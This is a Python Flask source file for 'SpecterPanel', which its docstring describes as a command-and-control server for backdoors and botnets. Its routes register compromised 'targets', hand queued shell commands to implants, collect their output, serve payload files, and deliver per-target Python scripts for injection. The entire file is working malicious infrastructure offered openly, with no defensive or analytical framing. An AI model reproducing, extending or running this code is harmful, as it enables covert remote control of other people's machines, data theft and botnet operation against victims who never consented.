# -*- coding: utf-8 -*-
"""
SpecterPanel - API Routes
This module defines the API routes for the SpecterPanel application.
These routes handle various API requests related to command execution,
target registration, and instruction retrieval.
It includes routes for receiving commands from backdoors,
saving command outputs, managing botnets, and handling socket connections.
It uses Flask's Blueprint to organize the API routes and SQLAlchemy for database interactions.
Routes are defined for:
- Receiving and executing commands from backdoors
- Saving command outputs from targets
- Retrieving botnet information for targets
- Registering new targets with the API
- Retrieving instructions for targets
- Managing socket connections for targets
This module also includes error handling and logging for API requests.
Routes list:
- /api/ApiCommand/<target_name>: Receives commands from backdoors
- /api/Apicommand/save_output: Saves command outputs from targets
- /api/BotNet/<target_name>: Retrieves botnet information for targets
- /api/registor_target: Registers new targets with the API
- /api/get_instraction/<target_name>: Retrieves instructions for targets
- /api/socket/<target_name>: Manages socket connections for targets
"""

from flask import Blueprint, jsonify, request, session, send_file
from sqlalchemy.orm import sessionmaker
from datetime import datetime
import os

from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet
from db.mange_db import config, _create_engine
from utility.email_temp import email_temp
from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output

emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

api = Blueprint('api', __name__)

# recive excute command from the backdoor
@api.route('/api/ApiCommand/<target_name>')
def apiCommand(target_name):
    if request.method == 'GET':
        try:
            api_token = request.args.get('token')
            IP = request.args.get('ip')
            opreatingSystem = request.args.get('os')
            valid = getlist(_session.query(ApiToken).filter_by(token=api_token).all(), sp=',')

            if valid:
                apiCommand = getlist(_session.query(APICommand).filter_by(
                        target_name=target_name,
                        condition=config.STUTAS[1]
                    ).all(),
                    sp=',',
                )
                if IP != readFromJson('target-info', target_name)['ip']:
                    update_target_info(target_name, IP, opreatingSystem)
                return jsonify({'allCommand': apiCommand}), 200
            else:
                return jsonify({'Error': 'Invalid api_token or no api token provided'}), 404
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            _session.rollback()
            return jsonify({'error': 'Server side Error'}), 500
        finally:
            _session.close()
    else:
        return jsonify({'Error': 'Unsupported method'}), 405


@api.route('/api/Apicommand/save_output', methods=['POST'])
def save_output():
    if request.method == 'POST':
        try:
            token = request.json.get('token')
            target_name = request.json.get('target_name')
            IP = request.json.get('ip')
            valid = getlist(_session.query(Targets).filter_by(target_name=target_name, token=token).all(), sp=',')

            if len(valid) != 0:
                outputs = request.json.get('output')
                opreatingSystem = request.json.get('os')

                for output in outputs:
                    update_output(target_name, output[0], output[1])
                    _session.query(APICommand).filter_by(ID=output[0]).update(
                        {
                            'condition': config.STUTAS[0],
                        }
                    )
                    _session.commit()

                if IP != readFromJson('target-info', target_name)['ip']:
                    update_target_info(target_name, IP, opreatingSystem)

                return jsonify({'message': 'Outputs were seved'}), 200
            else:
                return jsonify({'Error': 'Invalid token or target'}), 403
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return jsonify({'Error': 'Invalid api_token or no api token provided'}), 404
    else:
        return jsonify({'Error': "Unsupported method or didn't provid target name"}), 405


@api.route('/api/BotNet/<target_name>')
def BotNet(target_name):
    if request.method == 'GET':
        try:
            token = request.args.get('token')
            botNets = getlist(_session.query(BotNet).filter_by(target_name=target_name, token=token).all())
            response = {}
            for botNet in botNets:
                response[botNet[-2]] = botNet[-1]
            return jsonify(response), 200
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return jsonify({'Error': 'Invalid api_token or no api token provided'}), 404
    else:
        return jsonify({'Error': "Unsupported method or didn't provid target name"}), 405


@api.route('/api/registor_target', methods=['POST'])
def registor_target():
    if request.method == 'POST':
        try:
            apitoken = request.json.get('token')
            target_name = request.json.get('target_name')
            IP = request.json.get('ip')
            opratingSystem = request.json.get('os')

            if not apitoken or not target_name:
                return jsonify({'Error': 'Token or target_name not provided'}), 400

            valid = getlist(_session.query(ApiToken).filter_by(token=apitoken).all(), sp=',')
            if len(valid) != 0:
                target_name = target_name + str(datetime.now()).replace(' ', '')
                target = Targets(target_name, valid[0][2].replace(' ', ''), apitoken)
                _session.add(target)
                _session.commit()
                update_target_info(target_name, IP, opratingSystem)

                botNet = Instraction(config.ID(), 300, target_name, config.INSTRACTION[2], config.STUTAS[1])
                sock = Instraction(config.ID(), 300, target_name, config.INSTRACTION[1], config.STUTAS[1])
                web = Instraction(config.ID(), 300, target_name, config.INSTRACTION[0], config.STUTAS[1])

                _session.add(botNet)
                _session.add(sock)
                _session.add(web)
                _session.commit()

                return jsonify({'target_name': target_name}), 200
            else:
                return jsonify({'Error': 'Invalid api_token'}), 403
        except Exception as e:
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return jsonify({'Error': 'Internal server error'}), 500
        finally:
            _session.close()
    return jsonify({'Error': "Unsupported method or didn't provide target name"}), 405


@api.route('/api/get_instraction/<target_name>')
def instarction(target_name):
    if request.method == 'GET':
        try:
            token = request.args.get('token')
            IP = request.args.get('ip')
            opratingSystem = request.args.get('os')
            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')

            if len(valid) != 0:
                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
                if len(instraction) != 0:
                    if IP != readFromJson('target-info', target_name)['ip']:
                        update_target_info(target_name, IP, opratingSystem)
                    return jsonify({'delay': instraction[0][1], 'instraction': instraction[0][3]}), 200
                return jsonify({'Message': 'No instraction found'}), 404
            else:
                return jsonify({'error': 'Invalid api token'}), 403
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return jsonify({'Error': f'Exception {str(e)}'}), 500
    else:
        return jsonify({'Error': "Unsupported method or didn't provid target name"}), 405


@api.route("/api/socket/<target_name>", methods=['GET', 'POST'])
def socket(target_name=None):
    if request.method == "POST":
        is_connect = request.json.get('is_connect')
        token = request.json.get('token')
        check_token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0]
        if token == check_token[1]:
            targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
            instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(), sp=',')
            if targets and instraction:
                _session.query(Instraction).filter_by(
                    target_name=target_name, instraction=config.INSTRACTION[1]
                ).update({'stutas': config.STUTAS[0]})
            _session.commit()
            update_socket_info(token, is_connect)
            return jsonify({'status': 'status saved'}), 200
        else:
            return jsonify({'error': 'invalid token'}), 403

    elif request.method == 'GET':
        if 'email' not in session:
            return jsonify({'error': 'unauthorized'}), 401
        token = request.args.get('token')
        try:
            status = readFromJson('socket-status', token)['status']
            return jsonify({'status': status}), 200
        except KeyError as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: No status found for token {token} -[BUG] {str(e)}')
            return jsonify({'status': 'disconnected'}), 200

    return jsonify({'error': 'Unsupported method'}), 405


@api.route('/api/lib/<usePyload>', methods=['GET'])
def lib(usePyload):
    """
    Endpoint to serve static files from the specified path.
    This endpoint is used to send files like JavaScript libraries or other static resources.
    Args:
        usePyload (str): The name of the file to be served, formatted in the config.file_path.
    Returns:
        Response: The file is sent as an attachment if it exists, otherwise an error message is returned.
    """
    try:
        if request.method == 'GET':
            token = request.json.get('token')
            if not token:
                return jsonify({'Error': 'Token not provided'}), 400
            opratingSystem = request.json.get('os')
            ip = request.json.get('ip')
            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
            if len(valid) == 0:
                return jsonify({'Error': 'Invalid token'}), 403
            file_path = config.file_path.format(usePyload)
            if os.path.exists(file_path):
                log(f'[ROUT] : {request.endpoint} file: {file_path} is being sent')
                update_target_info(valid[0][2], ip, opratingSystem)
                return send_file(file_path, as_attachment=False, mimetype='text/plain')
            else:
                log(f'[ERROR ROUT] : {request.endpoint} error: File not found {file_path}')
                return jsonify({'Error': 'File not found'}), 404
        else:
            return jsonify({'Error': "Unsupported method"}), 405
    except Exception as e:
        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
        return jsonify({'Error': 'Internal server error'}), 500


@api.route('/api/injection/<target_name>', methods=['GET', 'POST'])
def injection(target_name):
    """
    API endpoint to retrieve or save a Python script for a given target.
    GET: Returns the script as plain text if found and token is valid.
    POST: Saves the script output (not implemented here, just a placeholder).
    Args:
        target_name (str): The name of the target to retrieve or save for.
    Returns:
        JSON response with message or script text, or error message.
    """
    try:
        token = request.args.get('token') if request.method == 'GET' else request.json.get('token')
        ip = request.args.get('ip') if request.method == 'GET' else request.json.get('ip')
        os_type = request.args.get('os') if request.method == 'GET' else request.json.get('os')

        update_target_info(target_name, ip, os_type)
        valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
        if not valid:
            return jsonify({'message': 'invalid'}), 403

        if request.method == 'GET':
            script_path = config.file_path.format(f"{target_name}.py")
            if os.path.exists(script_path):
                with open(script_path, "r", encoding="utf-8") as f:
                    script_text = f.read()
                return jsonify({'script': script_text}), 200
            else:
                return jsonify({'message': 'Script not found'}), 404

        elif request.method == 'POST':
            update_code_output(target_name, request.json.get('code_output'))
            return jsonify({'message': 'Output saved (not implemented)'}), 200

        return jsonify({'message': 'invalid method'}), 405

    except Exception as e:
        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
        return jsonify({'message': 'Error'}), 500
